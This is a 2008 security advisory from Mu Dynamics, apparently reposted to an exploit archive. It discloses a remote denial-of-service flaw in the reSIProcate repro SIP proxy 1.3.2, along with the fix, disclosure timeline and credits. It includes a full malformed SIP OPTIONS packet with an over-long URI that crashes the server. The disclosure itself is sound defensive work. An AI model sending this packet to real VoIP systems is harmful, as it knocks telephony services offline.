@@ -1,0 +1,91 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Remote DoS in reSIProcate [MU-200807-01]
+July 10, 2008
+
+http://labs.mudynamics.com/advisories.html
+
+
+Affected Products/Versions:
+
+* repro SIP proxy/registrar 1.3.2
+http://www.resiprocate.org/ReSIProcate_1.3.2_Release
+
+* Any product using the reSIProcate SIP stack 1.3.2 may also be vulnerable.
+
+
+Product Overview:
+
+http://www.resiprocate.org/
+
+reSIProcate is a SIP stack.  SIP is a protocol used for voice-over-IP
+telephony. repro is a SIP proxy/registrar that uses the reSIProcate SIP stack.
+
+
+Vulnerability Details:
+
+A malformed INVITE or OPTIONS message to the repro SIP proxy/registrar can
+crash the process. The crash is caused by an assertion failure that occurs
+when the domain name in the request line URI is too long
+(rutil/dns/DnsStub.cxx, line 493). For example, the URI may be
+"sip:bob@example.comAAAAAAA...", where "sip:bob@example.com" is followed by
+256 As. To cause the crash, the address in the To header must be a valid
+target address.
+
+Example invalid packet:
+  OPTIONS sip:bob@example.comAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA SIP/2.0
+  Via: SIP/2.0/UDP 127.0.0.1:54422;branch=z9hG4bKZqPsHMEiem;rport
+  To: "Bob" <sip:bob@example.com>
+  From: "Alice" <sip:alice@example.com>;tag=W4eHvLYEQX
+  Call-ID: nO1DpTVfo4@mudynamics.com
+  CSeq: 1 OPTIONS
+  Contact: <sip:alice@127.0.0.1:54422>
+  Max-Forwards: 70
+  Content-Length: 0
+
+
+Vendor Response / Solution:
+
+Update to 1.3.3, available from
+  https://www.resiprocate.org/files/pub/reSIProcate/releases/
+
+This bug was also fixed by the reSIProcate development team in SVN on
+April 23 (revision 7628).
+
+
+History:
+
+July 1, 2008  - First contact with vendor
+July 1, 2008  - Vendor acknowledges vulnerability
+July 3, 2008  - Vendor releases 1.3.3
+July 10, 2008 - Advisory released
+
+
+Mu-4000 vector:
+
+*.request-line.line.dsv.uri.body.string.append-overflow
+
+
+Credit:
+
+This vulnerability was discovered by the Mu Dynamics research team.
+
+http://labs.mudynamics.com/pgpkey.txt
+
+Mu Dynamics offers a new class of security analysis system, delivering a
+rigorous and streamlined methodology for verifying the robustness and security
+readiness of any IP-based product or application. Founded by the pioneers of
+intrusion detection and prevention technology, Mu Dynamics is backed by
+preeminent venture capital firms that include Accel Partners, Benchmark
+Capital and DAG Ventures. The company is headquartered in Sunnyvale, CA. For
+more information, visit the company's website at http://www.mudynamics.com.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.7 (Darwin)
+
+iD8DBQFIdqOZQLdDlEyOXHQRAvt+AJsHGgqEVoiQi0Nb7ND9CR7HteZJpgCeMgKv
+5lqpYSLdj7WBeXoD4l95+WA=
+=KUQC
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-07-12]
